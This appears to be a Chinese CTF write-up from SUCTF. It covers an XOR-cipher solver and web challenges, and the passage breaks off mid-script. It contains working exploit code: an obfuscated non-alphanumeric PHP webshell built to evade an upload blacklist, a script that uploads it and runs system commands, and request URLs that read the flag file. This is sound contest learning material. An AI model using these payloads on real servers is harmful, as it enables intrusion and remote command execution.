class="line">ChtESQoIT2cRHBsNKAYEb2Q7B0QXPABAARsHRU4DTyVYFxtPRi0ECg0wBwZeNwACSVQMBgFKRCUa</span><br><span class="line">XhBPI2MkDQAdSB4SPRtNFhsFDBoPSSQSUx5VPx1LCUk/DUkHOwYebzAHBkMDTyVYFxtPYEkPCk95</span><br><span class="line">DAYcfgsCCn4sBgFKRCUaXhBPI0VLAU87RQ0cPGUpChtFDQEIDS4aHFgAKAYESEQ7B0QXPABnKhxI</span><br><span class="line">IE4QQSQBUwdPIQwfDUk6D0kZJhwZRRgBAgtHVCIcAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1L</span><br><span class="line">KUkfDUknYiBUJQpNBxENB04VRSsRGhpHbAsECksnSAYVcwABAX48AQtHTC8SFhpEP0kKC0R0HAEW</span><br><span class="line">cwIUERwbYzoPRWoBFgdULQQOC1QnSB0bNhZNERsEDWQzSC9VHhtPIkkKC0R0AR0AcwoOCR0YGgtt</span><br><span class="line">YSQRUydVPAwZCEE6SBwdIQABCQdiKE4UVSMBUxZFKgYZAAA8DUkfOgkZFn4qHBpHaW0YUxpPOEkf</span><br><span class="line">DUV0AwAdN08CA1QYDBwUTyRVBxxBOEkCEQAyAR0AWTwFAFQbCAcDDGoCGxFSKU4PRVk7HUkEMgED</span><br><span class="line">BFQPBlFtaCUCUxlVLwFLHE8hSB4SPQEMRQYBGgVYKgNSHlROIx1LCU87AwAdNE8LCgZIGgEKRSga</span><br><span class="line">Fw0qGwAfDQAnBwQWcxwYFREaARsKQSRVFB1GOBphNk85DUkAJh8IFxwNGwFtcyUYFlRGLQAZHFQ1</span><br><span class="line">BAxTMQMEFgdiIxsUVGoGHBlFOAECC0d0IUkQMgFNEQEaB04TT0AmHBlFLgYPHAAdSAoSPU8ADAcb</span><br><span class="line">YydHVysbB1RTIwQOEUg9Bg5TORoeEVQEAAUCAD4dGgcqBUkcBE4gSBocPgoZDR0GDk4NVTkBUxhJ</span><br><span class="line">JwxLEUg9G2M8O08kRQMJBxpHUyUYFgBIJQcMRUohGx1TPwYGAFQcAQcUKg4aHFlEIwZGAU87REkX</span><br><span class="line">PABAARsHRAoIT0AxHBsNKAYESEQ7B0VTNwACSBAHBmQjTyVYFxtPYQ0ECgx0DAYcfgsCClkMBgFt</span><br><span class="line">byJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFioQBwZeNwACSBAHBkJHRCUaXhBPI0QP</span><br><span class="line">Ck9eLAYcfgsCClkMBgFLAC4aHFlEIwZhIU87RQ0cPEIJChtESQoIT2cRHBsNKAYEb3c8DRsWdAtN</span><br><span class="line">HBVIHg8JTitVFBsfRiEEEgA5HQobcxYCEFQfCAAJQWoHGgdLc2MiQk10BgYHcwMCCh8BBwlHRiUH</span><br><span class="line">UwdPIQwJCkQtYj4aJwdNFhsFDE4UVToQARxVIQgFRUc9Dh0AWTwCCBFIGhsXRTgdFgZPRjoECEV0</span><br><span class="line">DggaIRYZBBgNSQwLSTkGeT5VPx1LFk85DR0bOgEKRT1ICg8JAD4AARoAOAZhNk85DQscNxZNLFQL</span><br><span class="line">CABHSyMGAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1LKUkfDUknYiYbcyZNEhUGHU4UTycQBxxJ</span><br><span class="line">Ig5LD1UnHEkfOgQIRQAAAB1tbyJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFiobAEk6</span><br><span class="line">cxgMCwBIGgEKRT4dGhpHbAMeFlR0BAAYNk8ZDR0b</span><br></pre></td></tr></table></figure><p>类似维吉尼亚的变种，key长度远小于plain，循环异或后可统计字频，南邮CTF平台有一题相似的。详见 <a href="https://findneo.github.io/171005NuptVigenereWP/">https://findneo.github.io/171005NuptVigenereWP/</a> 。稍微更改其中读取密文部分即可。<code>flag{Something Just Like This}</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(file=<span class="string">'code.txt'</span>)</span>:</span></span><br><span class="line">    <span class="string">'''从文件中读取十六进制串，返回十六进制数组</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    c=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:x.strip(),open(<span class="string">'cipher.txt'</span>).readlines())).decode(<span class="string">'base_64'</span>)</span><br><span class="line">    cc= [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">    <span class="comment"># print cc,len(cc)</span></span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line">    <span class="comment"># c = open(file).read()</span></span><br><span class="line">    <span class="comment"># codeintlist = []</span></span><br><span class="line">    <span class="comment"># codeintlist.extend(</span></span><br><span class="line">    <span class="comment">#     (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2))))</span></span><br><span class="line">    <span class="comment"># return codeintlist</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">0xff</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0x20</span>,<span class="number">0x80</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">50</span>))</span><br><span class="line">    cipher = getCipher()</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join(map(chr,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'web.suctf.asuri.org'</span></span><br><span class="line">        PORT = <span class="number">81</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> requests.get(<span class="string">'http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1'</span>).content</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><code>$flag=&quot;SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}&quot;;</code> </p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"illegal char"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用burp intruder跑一遍，发现不在黑名单里的可打印字符有 <code>$()[]_~=;.</code>  共10个。</p><p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p><p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p><p>接下来就是构造一个由 <code>$()[]_~=;.</code> 组成的webshell了，主要思路来自 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a> 。</p><p>构造出的最终结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);</span><br></pre></td></tr></table></figure><p>详细注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= </span><br><span class="line">$_=_==_;<span class="comment">//1</span></span><br><span class="line">$__=~一[$_];<span class="comment">//G</span></span><br><span class="line">$___=~了[$_];<span class="comment">//E</span></span><br><span class="line">$____=~端[$_];<span class="comment">//T</span></span><br><span class="line">$_____=~得[$_];<span class="comment">//A</span></span><br><span class="line">$______=~第[$_];<span class="comment">//S</span></span><br><span class="line">$_______=~学[$_];<span class="comment">//R</span></span><br><span class="line">$_=_.$__.$___.$____;<span class="comment">//_GET</span></span><br><span class="line">$_=$$_;<span class="comment">//$_GET</span></span><br><span class="line">$__=$_____.$______.$______.$___.$_______.$____;<span class="comment">//ASSERT</span></span><br><span class="line">$__($_[_]);<span class="comment">//ASSERT($_GET[_]);</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=phpinfo();</span><br></pre></td></tr></table></figure><p>可以有一个更短更舒服的选择</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);</span><br></pre></td></tr></table></figure><p>详细注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_=_==_;<span class="comment">//1</span></span><br><span class="line">$__=~一[$_];<span class="comment">//G</span></span><br><span class="line">$___=~了[$_];<span class="comment">//E</span></span><br><span class="line">$____=~端[$_];<span class="comment">//T</span></span><br><span class="line">$_=_.$__.$___.$____;<span class="comment">//_GET</span></span><br><span class="line">$_=$$_;<span class="comment">//$_GET</span></span><br><span class="line">$_[_]($_[__]);<span class="comment">//$_GET[_]($_GET[__]);</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=assert&amp;__=phpinfo();</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system(%22ls%20-l%20/%22);</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=readfile(%27/Th1s_14_f14g%27);</span></span><br><span class="line"></span><br><span class="line">SUCTF&#123;KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o&#125;</span><br></pre></td></tr></table></figure><p>上传小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">data=<span class="string">"&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);"</span></span><br><span class="line">base=<span class="string">"http://web.suctf.asuri.org:82/"</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>: (<span class="string">'findneo.php'</span>, data, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">content = requests.post(base+<span class="string">"upload.php"</span>, files=files).text</span><br><span class="line">cmd=<span class="string">'system("dir /");'</span></span><br><span class="line">payload=base+re.match(<span class="string">"[\s\S]*Stored in: ([a-z.0-9/]+)[\s\S]*"</span>,content).group(<span class="number">1</span>)+<span class="string">"?_=assert&amp;__="</span>+cmd</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">print</span> requests.get(payload).content</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system("dir /");</span></span><br><span class="line"><span class="comment"># 1Th1s_14_f14g  boot  etc   lib mediaopt   root  sbin  sys  usr</span></span><br><span class="line"><span class="comment"># bin      dev   home  lib64  mntproc  run   srv   tmp  var</span></span><br></pre></td></tr></table></figure><p>写了一个用上述方法生成任意字母构成的字符串的小程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: 'findneo'</span></span><br><span class="line"><span class="comment"># compose php code from limited whitelist: $()[]_~=;.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gendict</span><span class="params">(index=<span class="string">'_==_'</span>,target_chars=[chr<span class="params">(i)</span> for i in range<span class="params">(<span class="number">0x20</span>,<span class="number">0x7f</span>)</span>])</span>:</span></span><br><span class="line">    sentence=<span 